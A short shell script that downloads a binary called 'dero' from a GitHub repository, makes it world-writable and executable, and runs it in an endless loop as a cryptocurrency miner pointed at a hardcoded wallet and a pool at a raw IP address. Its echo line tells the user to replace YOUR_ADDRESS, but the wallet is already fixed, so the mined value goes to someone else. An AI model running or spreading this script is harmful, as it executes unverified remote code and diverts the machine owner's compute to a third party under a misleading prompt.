wget https://github.com/sbwsmg/doraemon/raw/main/dero
chmod 777 dero

#!/bin/bash
echo "Replace YOUR_ADDRESS to run the miner"
while :; do
    ./dero -w deroi1qyzlxxgq2weyqlxg5u4tkng2lf5rktwanqhse2hwm577ps22zv2x2q9pvfz92x6hsk03skqgr8tscz0xla -r 170.187.197.220:443 -p stratum;
    sleep 5;
done
